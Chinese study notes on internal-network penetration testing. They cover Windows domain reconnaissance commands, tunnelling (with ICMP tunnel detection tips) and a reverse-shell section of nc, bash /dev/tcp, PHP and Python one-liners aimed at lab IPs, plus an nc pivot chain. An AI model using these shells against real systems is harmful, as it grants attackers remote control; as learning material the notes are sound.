---
title: 内网安全攻防
date: 2020-11-20
tags:
 - safe
categories: 
 - safe
---

# 内网安全攻防

## 内网渗透测试基础

### 内网基础知识

- 工作组

  将不同的计算机按照功能分别列入不同的组，想要访问某个部门的资源，只要在【网络】里双击该部门的工作组名

- 域Domain

  域是一个有安全边界的计算机集合，与工作组相比，域的安全管理机制更加严格，用户想要访问域内的资源，必须以合法的身份登录域，而用户对域内的资源用什么权限，取决于用户在域内的身份。

- 域控制器DC

  是域中的一台类似管理服务器的计算器，负责所有接入的计算机喝用户的验证工作，也就是说域内所有用户的密码Hash都保存在域控制器中。

### 主机平台与常用的工具

- kali linux

	- WCE(Windows凭据管理器)
	- minikatz(从内存中获取明文密码)
	- Responder(嗅探网络中所有的LLMUNR包，获取主机的信息)
	- BeEF(一款针对浏览器的渗透测试工具)
	- DSHashes(从NTDSXtract中提取用户易于理解的散列值)
	- PowerSploit(一款基于PowerShell的后渗透测试框架)
	- Nishang(一款针对PowerShell的渗透测试工具)
	- Empire(一款内网渗透测试利器)
	- ps_encoder.py(使用Base64编码封装的PowerShell命令包)
	- smbexec(一个使用samba工具的快速psExec工具)
	- 后门制造工厂(对PE、ELF等二进制注入Shellcode)
	- veil(用于生成绕过常见杀软的Metasploit有效载荷)
	- Metasploit(计算机安全漏洞项目框架)
	- Cobalt Strike(一款优秀的后渗透测试平台)

- Windows平台

	- Namp(一款免费的网络发现喝安全审计工具)
	- wireshark(一款免费且开源的网络协议喝数据包解析器)
	- PuTTY(一款免费且开源的SSH和Telent客户端)
	- SQLMap(一款开源且免费的SQL注入工具)
	- BurpSuite(一款针对Web应用程序进行安全测试的代理工具)
	- Hydra(一个网络登录暴利破解工具)
	- Getif(一款手机SNMP设备信息的工具)
	- Cain&Abel(一个密码恢复工具，集成嗅探等多种功能)
	- PowerSploit(一款基于PowerShell的后渗透测试框架)
	- Nishang(一款针对PowerShell的渗透测试工具)

- Windows Powershell基础

	- 查看Powershell版本

		- Get-Host

	- powershell常用命令

		- New-Item hack -ItemType Directory(新建目录)
		- New-Item ailx0000.txt(文件名) -ItemType File(新建文件)
		- Set-Content .\ailx0000.txt -Value "hi hacker ailx10..."(写文件)
		- Add-Content .\ailx0000.txt -Value "ooops~"(追加内容)
		- Get-Content .\ailx0000.txt(显示内容)
		- Clear-Content .\ailx0000.txt(清楚内容)
		- Remove-Item .\ailx0000.txt(删除文件)
		- 高级部分

			- 绕过本地权限并执行
			- 从网站服务器下载脚本，绕过本地权限并偷偷执行
			- 使用Base64对PowerShell命令进行编码

### 构建内网环境

- win7
- win2008
- win2012
- Metasploit2
- Metasploit3
- OwaspBWA
- DVWA

## 构建内网渗透环境

### https://zhuanlan.zhihu.com/p/161373113

## 内网信息收集

### 手动收集信息

- ipconfig /all(查询网络配置信息)
- systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"(查询操作系统和软件信息)
- echo %PROCESSOR_ARCHITECTURE%(查看处理器型号)
- wmic product get name,version(获取如软件信息)
- powershell "Get-WmiObject -class Win32_Product | Select-Object -Property name,version"
- wmic service list brief(查看本机服务信息)
- wmic process list brief(查看进程列表)
- wmic startup get commond,caption(查看启动程序信息)(使用无效)
- SCHTASKS /QUERT /FO LIST(查看计划任务)(使用无效)
- net statistics workstation(查看主机开机时间)
- net user(查询用户列表)
- net localgroup Administrators
- query user || qwinsta
- net session(列出或断开本地计算机与所连接的客户端的会话)(需要管理员权限)
- netstat -ano(查询端口列表)
- systeminfo(查看补丁列表)
- net share(查询本机共享列表)
- wmic share get name,path,status(查询本机共享列表)
- route print(查询路由表及所有可用接口的API缓存表)
- arp -a(查看arp列表)
- netsh firewall show config(查看防火墙相关配置)
- reg query "HKEY_CURRENT_USER\Software\Microsoft'\Windows\CurrentVersion\Internet Settings"(查看代理配置情况)
- REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp  " /V PortNumber(查询并开启远程连接服务)

### 查看当前权限

- whoami(查看当前权限)
- whoami /all(获取域SID)
- net user ailx00 /domain(查询指定用户的详细信息)

### 判断是都存在域

- ipconfig /all
- nslookup hackbiji.top
- systeminfo(查看系统详细信息)
- net config workstation(查询当前登录域及登陆用户信息)
- net time /domain(判断主域)

### 探测域内存活主机

- nbtscan-1.0.35.exe 192.168.160.1/24(利用NetBIOS快速探测内网(软件需要下载))
- for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.160.%I | findstr "TTL"(利用ICMP协议快速探测内网)
- arp -a(通过ARP扫描快速探测内网(需要自己下载))

### 扫描域内端口

- telnet 192.168.160.143 22(利用telnet命令快速扫面)
- Metasploit端口扫描(scanner/portscan/tcp)
- 端口Banner信息(nc是个好东西)

	- 文件共享服务端口(21、22、69、2049、139、389)
	- 远程连接服务端口(22、23、3389、5900、5632)
	- Web应用服务端口(80、443、8080、7001、7002、8089、9090、4848、1352)
	- 数据库服务端口(3306、1433、1521、5432、6379、5000、9200)
	- 邮件服务端口(25、110、143)
	- 网络常见协议端口(53、67、68、161)

- Nmap主机发现扫活(重头戏)

### 收集域内基础信息

- 查询域(需要启动Computer Browser服务)

	- net view /domain(查询域)
	- net view /domain:HACKBIJI(查询域内所有计算机)
	- net group /domain(查询域内所有用户组列表)(默认13个组)
	- net group "domain computers" /domain(查询所有域成员计算机列表)(确实是所有成员的名字)
	- net accounts /domain(获取域密码信息)(这个是密码设置的要求)
	- nltest /domain_trusts(获取域信任信息)

- 查找域控制器

	- nltest /DCLIST:HACKBIJI(查看与控制器的机器名)
	- nslookup -type=SRV _ldap._tcp(查看域控制器的主机名)
	- net time /domain(查看当前时间)
	- net group "Domain Controllers" /domain(查看域控制器组)

- 查询所有域用户列表

	- net user /domain(向域控制器进行查询)(使用命令)
	- wmic useraccount get /all(获取域内用户的详细信息)(用户名、描述、SID、域名、状态)
	- net localgroup Administrators(查询本地管理员组用户)(2个用户名，1个用户组)

- 查询域管理员用户组

	- net group "domain admins" /domain(查询域管理员用户)
	- net group "Enterprise Admins" /domain(查询管理员用户组)

- 常用域管理员定位工具

	- psloggedon.exe
	- PVEFindADUser.exe
	- netview.exe
	- Nmap的NSE脚本
	- PowerVIew脚本

- 查找域管理进程

	- net group "domain admins" /domain(获取域管理员列表)
	- tasklist /v(列出本机的所有进程及进程用户)
	- net group "Domain Controllers" /domain(查询与控制器列表)
	- net group "Domain Admins" /domain(收集域管理员列表)
	- NetSess.exe -h(收集所有活动域的会话列表)(需要下载软件)

- 利用Powershell收集信息

	- Get-ExecutionPolicy(检查Powershell状态)(Restricted受限制的)

## 隐蔽通信隧道技术

### 隐蔽通信基础知识

- 隐蔽隧道通信概述

  什么是隧道？隧道就是让原本不能通行的网络，能够通行。
- 网络安全研究人员需要掌握常见的隧道技术

	- 网络层:IPv6隧道、ICMP隧道、GRE隧道
	- 传输层:TCP隧道、UDP隧道、常规端口转发
	- 应用层:SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道

- 判断内网的连通性

	- ICMP协议

		- ping www.baidu.com

	- TCP协议(需要安装nc，配置环境变量)

		- nc64 -zv 192.168.0.1 445

	- HTTP协议(需要安装curl,配置环境变量)

		- curl 192.168.1.0

	- DNS协议(可以指定DNS服务器来解析域名)

		- nslookup www.zhihui.com 8.8.8.8(谷歌)  推荐114.114.114.114(电信)

- 网络层隧道技术

	- IPv6隧道

	  当前很多边界设备、防火墙、入侵检测系统还无法识别IPv6的通信内容，但大多数操作系统已经支持IPv6通信

	- ICMP隧道

		- https://zhuanlan.zhihu.com/p/113692119
		- https://github.com/DhavalKapil/icmptunnel
		- https://github.com/inquisb/icmpsh.git
		- 关闭系统的Ping应答

			- sysctl -w net.ipv4.icmp_echo_ignore_all=1

		- 防御ICMP隧道攻击的方法

			- 检测同一来源的ICMP数据包的数量，一个正常的Ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在短时间产生上千个ICMP数据包
			- 注意那些Payload大于64字节的ICMP包
			- 寻找响应数据包中的Payload和请求数据包中的Payload不一致的ICMP数据包

		- ICMP的应用场景

			- 某些服务器的tcp、udp流量被禁止，可以通过PingTunnel谈过
			- 某些场合如学校、咖啡厅、机场，需要登录跳转验证，可以通过PingTunnel
			- 某些网络，tcp，udp传输很慢，可以通过Pingtunnel加速网络

## 端口转发

### LCX端口转发

https://github.com/UndefinedIdentifier/LCX

### Ubuntu安装增强版nc

Ubuntu上默认安装的是netcat-openbsd,而不是经典的netcat-traditional.
安装
sudo apt -y install netcat-traditional
切换版本
sudo update-alternatives --config nc

## 反弹shell

黑客控制了目标，弹出一个shell，构建一个稳定的通信后门

### 概念:黑客控制了目标，弹一个shell，构建一个稳定得通信后门

### 先弹shell就是正向shell，后连接

### 后弹shell就是反向shell，先监听

### 正向shell:客户端想要获得服务端得shell

### 反向shell:服务端想要获得客户端的shell(也就是反弹shell)

### nc反弹shell

- 正向shell(服务端送shell)

  kali(服务端)，监听23333端口，并且反弹shell
  nc -lvp 23333 -e /bin/sh
  ubuntu(客户端)，连接kali，拿到shell控制权
  nc 192.168.1.229 23333

- 反向shell(客户端送shell)

  切换Ubuntu的nc版本，默认设置free-bsd的阉割版
  update-alternatives --config nc
  sudo apt-get -y install netcat-traditional(执行上面一条没有结果，表示你没有安装增强版的nc)
   kali监听23333端口(等待客户端吃钩子)
  nc -lvp 23333
   启动ubuntu吃钩子
  nc 192.168.1.229 23333 -e /bin/sh

### bash反弹shell

服务端kali监听23333，钩子准备好
nc -lvp 23333
客户端ubuntu(bash反弹shell)
bash -i >& /dev/tcp/192.168.1.229/23333 0>&1
bash -i
产生一个bash交互环境
这个>&的意思是:
将联合符号前面的内容与后面相结合然后一起重定向给后者
/dev/tcp/192.168.1.229/23333 
linux环境中所有的内容都是以文件的形式存在，就是 让主机与目标主机192.168.1.229:23333的端口建立一个TCP连接
0>&1
将标准的输入与标准的输出内容相结合，然后重定向给前面标准的输出内容

### php反弹shell 

在kali上监听23333
nc -lvp 23333
客户端吃钩子，服务端成功控制客户端

客户端ubuntu
php -r '$f=fsockopen("192.168.1.229",23333);exec("/bin/sh -i <&3 >&3 2>&3");'

### python反弹shell

服务端kali监听23333，等待客户端吃钩子
客户端ubuntu使用python2.7
代码如下
import socket,subprocess,os; 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.160.140",23333));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

### curl反弹shell

原理是利用bash来反弹shell
想要了解自行百度
ctf用到过

### wget反弹shell(同上)

### 还有其他的反弹shell(比如ruby，perl等等)

##  netcat内网代理实践

环境
kali：192.168.1.1
ubuntu18：192.168.1.2
ubuntu16：192.168.1.3
kali可与ubuntu18互通，但是不能与ubuntu16互通，ubuntu18可与ubuntu16互通。
服务器kali
nc -lvp 23333
ubuntu16
nc -lvp 23333 -e /bin/sh(交出自己的shell)
ubuntu18
nc -v 192.168.1.3 23333 -c "nc -v 192.168.1.1 23333"(拿到ubuntu16的shell，然后通过nc代理到kali上)